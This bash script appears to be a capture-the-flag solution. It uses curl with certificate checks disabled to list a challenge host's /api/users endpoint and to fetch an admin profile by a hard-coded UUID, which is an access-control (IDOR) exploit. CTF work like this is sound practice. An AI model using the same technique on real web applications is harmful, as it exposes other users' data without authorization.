#!/usr/bin/env bash
set -euo pipefail

target="${1:-https://406c83cb2320cccd.chal.ctf.ae}"
admin_uuid="${2:-7cc07c75-5934-485c-a38e-90228c6c8479}"

echo "[*] Fetching API users"
curl -sS -k "$target/api/users"
echo

echo "[*] Fetching admin profile"
curl -sS -k "$target/profile/$admin_uuid"
echo
